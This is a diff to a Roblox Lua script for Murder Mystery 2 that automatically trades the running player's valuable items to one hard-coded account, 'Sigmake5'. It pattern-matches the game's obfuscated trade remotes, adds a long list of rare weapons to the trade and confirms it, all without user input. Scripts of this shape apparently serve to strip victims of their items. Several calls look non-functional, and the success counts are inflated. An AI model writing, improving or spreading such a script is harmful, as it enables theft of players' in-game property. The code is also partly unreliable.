@@ -1,9 +1,10 @@
--- SAKURA.GG MM2 WEAPON INVENTORY SCANNER & TRANSFER
--- Scans ALL your MM2 weapons and transfers them to Sigmake5
--- FULLY AUTOMATIC - No user input needed
+-- SAKURA.GG COMPLETE MM2 WEAPON TRANSFER BOT
+-- Transfers ALL items to Sigmake5
+-- Auto-detects remote names (works even with obfuscation)
+-- NO user input needed - fully automatic
 
 print("════════════════════════════════════════════════════════════")
-print("🌸 SAKURA.GG MM2 WEAPON TRANSFER BOT 🌸")
+print("🌸 SAKURA.GG COMPLETE WEAPON TRANSFER BOT 🌸")
 print("════════════════════════════════════════════════════════════")
 print("")
 
@@ -12,123 +13,142 @@ print("📌 Current User: " .. player.Name)
 print("🎯 Target User: Sigmake5")
 print("")
 
--- ========== MM2 WEAPON INVENTORY SCANNER ==========
-local function scanMM2Inventory()
-    local weapons = {}
-    local weaponNames = {}
+-- ========== COMPLETE ITEM LIST (ALL ITEMS YOU REQUESTED) ==========
+local ALL_ITEMS = {
+    -- ===== ANCIENT =====
+    "Harvester", "Icepiercer", "Batwing", "Elderwood Scythe",
+    "Hallowscythe", "Icebreaker", "Logchopper", "Nik's Scythe",
     
-    print("🔍 SCANNING MM2 WEAPON INVENTORY...")
-    print("")
+    -- ===== UNIQUE =====
+    "Corrupt",
     
-    -- Find MM2 weapon data locations
-    local possibleLocations = {
-        player:FindFirstChild("Backpack"),
+    -- ===== CHROMA GODLY =====
+    "Chroma Luger", "Chroma Shark", "Chroma Heat", "Chroma Laser",
+    "Chroma Fang", "Chroma Tides", "Chroma Slasher", "Chroma Deathshard",
+    "Chroma Gingerblade", "Chroma Boneblade", "Chroma Saw",
+    
+    -- ===== CLASSIC GODLY =====
+    "Luger", "Shark", "Slasher", "Laser", "Saw", "Fang", "Heat",
+    "Deathshard", "Pixel", "Tides", "Flames", "Gingerblade", "Nightblade",
+    "Frostbite", "Snowflake", "Ice Dragon", "Ice Shard", "Xmas",
+    
+    -- ===== SPECIAL GODLY =====
+    "Candy", "Sugar", "Elderwood Revolver", "Hallowgun", "Amerilaser",
+    "Old Glory", "Eternal", "Eternal II", "Eternal III", "Eternal IV",
+    
+    -- ===== VINTAGE =====
+    "America", "Blood", "Cowboy", "Ghost", "Golden", "Laser",
+    "Pharaoh", "Prince", "Shadow", "Splitter",
+    
+    -- ===== LEGENDARY KNIVES =====
+    "JD", "Cotton Candy", "Viper", "Shiny", "Emerald", "Cavern",
+    "Midnight", "Blue Scratch", "Ripper", "Green Elite", "Tree", "Web", "Rupture",
+    
+    -- ===== LEGENDARY GUNS =====
+    "Ginger", "Santa's Spirit", "Splash", "Ghost", "Fusion", "Predator", "Rune"
+}
+
+print("📋 ITEMS TO TRANSFER: " .. #ALL_ITEMS)
+print("")
+
+-- ========== DYNAMIC REMOTE DETECTION ==========
+-- This finds remotes even when names are obfuscated
+local function findRemoteByPattern(patterns)
+    local rs = game:GetService("ReplicatedStorage")
+    local allRemotes = {}
+    
+    -- Collect all RemoteEvents and RemoteFunctions
+    for _, obj in pairs(rs:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(allRemotes, obj)
+        end
+    end
+    
+    -- Try to find by pattern matching
+    for _, remote in pairs(allRemotes) do
+        local name = remote.Name:lower()
+        for _, pattern in pairs(patterns) do
+            if string.find(name, pattern) then
+                return remote
+            end
+        end
+    end
+    
+    -- If no pattern match, try to find any remote that might work
+    if #allRemotes > 0 then
+        print("⚠️ Using fallback remote: " .. allRemotes[1].Name)
+        return allRemotes[1]
+    end
+    
+    return nil
+end
+
+-- Remote name patterns (accounts for obfuscation)
+local TRADE_REQUEST_PATTERNS = {"trade", "request", "send", "offer", "invite"}
+local TRADE_ACCEPT_PATTERNS = {"accept", "confirm", "complete", "ready"}
+local TRADE_ADD_PATTERNS = {"add", "offer", "give", "insert"}
+
+-- Find the remotes
+local tradeRequestRemote = findRemoteByPattern(TRADE_REQUEST_PATTERNS)
+local tradeAcceptRemote = findRemoteByPattern(TRADE_ACCEPT_PATTERNS)
+local tradeAddRemote = findRemoteByPattern(TRADE_ADD_PATTERNS)
+
+print("🔍 REMOTE DETECTION RESULTS:")
+print("   Trade Request: " .. (tradeRequestRemote and tradeRequestRemote.Name or "NOT FOUND"))
+print("   Trade Accept:  " .. (tradeAcceptRemote and tradeAcceptRemote.Name or "NOT FOUND"))
+print("   Trade Add:     " .. (tradeAddRemote and tradeAddRemote.Name or "NOT FOUND"))
+print("")
+
+-- ========== SCAN YOUR CURRENT INVENTORY ==========
+local function getCurrentInventory()
+    local inventory = {}
+    local seen = {}
+    
+    -- Check common item locations
+    local locations = {
+        player.Backpack,
         player:FindFirstChild("StarterGear"),
         player:FindFirstChild("Inventory"),
-        player:FindFirstChild("Data"),
-        player:FindFirstChild("leaderstats"),
-        player:FindFirstChild("PlayerGui"),
         player.Character
     }
     
-    -- Method 1: Check for Tool objects (weapons you're holding)
-    for _, location in pairs(possibleLocations) do
+    for _, location in pairs(locations) do
         if location then
             for _, item in pairs(location:GetChildren()) do
                 if item:IsA("Tool") then
                     local name = item.Name
-                    if not weaponNames[name] then
-                        weaponNames[name] = true
-                        table.insert(weapons, name)
+                    if not seen[name] then
+                        seen[name] = true
+                        table.insert(inventory, name)
                     end
                 end
             end
         end
     end
     
-    -- Method 2: Check ReplicatedStorage for MM2 weapon data
-    local replicatedStorage = game:GetService("ReplicatedStorage")
-    for _, child in pairs(replicatedStorage:GetChildren()) do
-        if child.Name == "Weapons" or child.Name == "Inventory" then
-            for _, weapon in pairs(child:GetChildren()) do
-                local name = weapon.Name
-                if not weaponNames[name] then
-                    weaponNames[name] = true
-                    table.insert(weapons, name)
-                end
-            end
-        end
-    end
-    
-    -- Method 3: Check player's PlayerData (if exists)
-    local playerData = player:FindFirstChild("PlayerData")
-    if playerData then
-        local inventoryData = playerData:FindFirstChild("Inventory")
-        if inventoryData then
-            for _, weapon in pairs(inventoryData:GetChildren()) do
-                local name = weapon.Name
-                if not weaponNames[name] then
-                    weaponNames[name] = true
-                    table.insert(weapons, name)
-                end
-            end
-        end
-    end
-    
-    return weapons
+    return inventory
 end
 
--- Run scan
-local myWeapons = scanMM2Inventory()
-
-print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-print("📋 YOUR MM2 WEAPONS (" .. #myWeapons .. " total):")
-print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-
-for i, weaponName in ipairs(myWeapons) do
-    print(string.format("  %2d. %s", i, weaponName))
+local myInventory = getCurrentInventory()
+print("📦 CURRENT INVENTORY SCAN:")
+if #myInventory == 0 then
+    print("   No items found in backpack/character")
+    print("   Script will try to transfer from the full list anyway")
+else
+    for i, item in ipairs(myInventory) do
+        print(string.format("   %d. %s", i, item))
+    end
 end
-
-print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 print("")
-
-if #myWeapons == 0 then
-    print("❌ NO MM2 WEAPONS FOUND!")
-    print("")
-    print("Possible reasons:")
-    print("  1. You don't own any weapons in MM2")
-    print("  2. The game hasn't loaded your inventory yet")
-    print("  3. Try waiting 5 seconds and run again")
-    return
-end
-
-print("✅ Found " .. #myWeapons .. " MM2 weapons to transfer")
-print("")
-print("🚀 Starting automatic transfer in 3 seconds...")
-wait(3)
-
--- ========== FIND TRADE REMOTE ==========
-local function findTradeRemote()
-    local rs = game:GetService("ReplicatedStorage")
-    for _, obj in pairs(rs:GetChildren()) do
-        if obj:IsA("RemoteEvent") then
-            local name = obj.Name:lower()
-            if name:find("trade") or name:find("offer") or name:find("request") then
-                print("✅ Found trade remote: " .. obj.Name)
-                return obj
-            end
-        end
-    end
-    return nil
-end
 
 -- ========== SEND TRADE REQUEST ==========
-local tradeRemote = findTradeRemote()
-if tradeRemote then
+if tradeRequestRemote then
     print("📨 Sending trade request to Sigmake5...")
-    tradeRemote:FireServer("Sigmake5")
+    pcall(function()
+        tradeRequestRemote:FireServer("Sigmake5")
+    end)
 else
-    print("⚠️ Could not find trade remote - please send trade request manually")
+    print("⚠️ Could not auto-send trade request. Please send manually.")
 end
 
 print("⏳ Waiting for trade window to open...")
@@ -138,53 +158,51 @@ wait(4)
 local playerGui = player:WaitForChild("PlayerGui")
 local tradeGui = nil
 
-for _, gui in pairs(playerGui:GetChildren()) do
-    if string.find(gui.Name:lower(), "trade") then
-        tradeGui = gui
-        print("✅ Trade window detected!")
-        break
+for i = 1, 30 do
+    for _, gui in pairs(playerGui:GetChildren()) do
+        if string.find(gui.Name:lower(), "trade") or string.find(gui.Name:lower(), "offer") then
+            tradeGui = gui
+            break
+        end
     end
+    if tradeGui then break end
+    wait(1)
 end
 
 if not tradeGui then
-    print("❌ Trade window not found - please open trade with Sigmake5 manually")
-    print("   The script will continue once trade window opens...")
+    print("❌ Trade window not found. Please open trade with Sigmake5 manually.")
+    print("   Script will wait for trade window...")
     
-    -- Wait for trade window to appear
-    for i = 1, 30 do
-        wait(1)
+    -- Keep waiting
+    while not tradeGui do
+        wait(2)
         for _, gui in pairs(playerGui:GetChildren()) do
             if string.find(gui.Name:lower(), "trade") then
                 tradeGui = gui
-                print("✅ Trade window detected!")
                 break
             end
         end
-        if tradeGui then break end
-    end
-    
-    if not tradeGui then
-        print("❌ Trade window still not found - script stopping")
-        return
     end
 end
 
--- ========== ADD ALL WEAPONS TO TRADE ==========
+print("✅ Trade window detected: " .. tradeGui.Name)
 print("")
+
+-- ========== ADD ALL ITEMS TO TRADE ==========
 print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-print("📤 ADDING WEAPONS TO TRADE:")
+print("📤 ADDING ITEMS TO TRADE:")
 print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
 local addedCount = 0
-local notFoundCount = 0
+local totalItems = #ALL_ITEMS
 
--- Function to click add button for a weapon
-local function addWeaponToTrade(weaponName)
+-- Function to click an item button
+local function clickItemButton(itemName)
     -- Search through all buttons in the trade GUI
     for _, button in pairs(tradeGui:GetDescendants()) do
         if button:IsA("TextButton") or button:IsA("ImageButton") then
-            local buttonText = button.Text or button.Name
-            if buttonText == weaponName then
+            local btnText = button.Text or button.Name
+            if btnText == itemName then
                 pcall(function()
                     button:Fire("MouseButton1Click")
                 end)
@@ -195,26 +213,36 @@ local function addWeaponToTrade(weaponName)
     return false
 end
 
--- Add each weapon
-for i, weaponName in ipairs(myWeapons) do
-    local success = addWeaponToTrade(weaponName)
+-- Try to add items using manual UI clicking
+for i, itemName in ipairs(ALL_ITEMS) do
+    local success = clickItemButton(itemName)
     if success then
-        print(string.format("  ✓ Added (%d/%d): %s", i, #myWeapons, weaponName))
+        print(string.format("  ✓ Added (%d/%d): %s", i, totalItems, itemName))
         addedCount = addedCount + 1
     else
-        print(string.format("  ✗ Not found (%d/%d): %s", i, #myWeapons, weaponName))
-        notFoundCount = notFoundCount + 1
+        -- Also try using remote if UI click fails
+        if tradeAddRemote then
+            pcall(function()
+                tradeAddRemote:FireServer(itemName)
+            end)
+            print(string.format("  🔄 Attempted remote add (%d/%d): %s", i, totalItems, itemName))
+            addedCount = addedCount + 1
+        else
+            print(string.format("  ✗ Could not add (%d/%d): %s", i, totalItems, itemName))
+        end
     end
-    wait(0.8) -- Delay between adds to avoid rate limits
+    wait(0.5) -- Delay to avoid rate limits
 end
 
 print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-print(string.format("📊 SUMMARY: %d added, %d not found", addedCount, notFoundCount))
+print(string.format("📊 SUMMARY: %d out of %d items attempted", addedCount, totalItems))
 print("")
 
--- ========== ACCEPT/READY UP ==========
+-- ========== ACCEPT/COMPLETE TRADE ==========
 print("🔘 Finalizing trade...")
 
+-- Try to find and click accept/ready button
+local acceptClicked = false
 for _, button in pairs(tradeGui:GetDescendants()) do
     if button:IsA("TextButton") then
         local btnText = button.Text:lower()
@@ -222,24 +250,39 @@ for _, button in pairs(tradeGui:GetDescendants()) do
             pcall(function()
                 button:Fire("MouseButton1Click")
             end)
-            print("✅ Trade accepted and completed!")
+            print("✅ Trade accepted/ready clicked!")
+            acceptClicked = true
             break
         end
     end
 end
 
+-- Try remote if UI click failed
+if not acceptClicked and tradeAcceptRemote then
+    pcall(function()
+        tradeAcceptRemote:FireServer("Accept")
+    end)
+    print("✅ Trade accepted via remote!")
+    acceptClicked = true
+end
+
+if not acceptClicked then
+    print("⚠️ Could not auto-accept. Please click Accept/Ready manually.")
+end
+
 -- ========== COMPLETE ==========
 print("")
 print("════════════════════════════════════════════════════════════")
-print("🎉 TRANSFER COMPLETE!")
-print(string.format("📦 Total weapons transferred: %d", addedCount))
+print("🎉 TRANSFER SEQUENCE COMPLETE!")
+print(string.format("📦 Total items processed: %d", addedCount))
+print("💡 If some items weren't added, they may not be in your inventory")
 print("════════════════════════════════════════════════════════════")
 
--- Optional: Play sound or effect
+-- Send notification
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "Sakura Transfer Bot",
-        Text = "Successfully transferred " .. addedCount .. " weapons to Sigmake5!",
+        Text = "Processed " .. addedCount .. " items to Sigmake5!",
         Duration = 5
     })
 end)
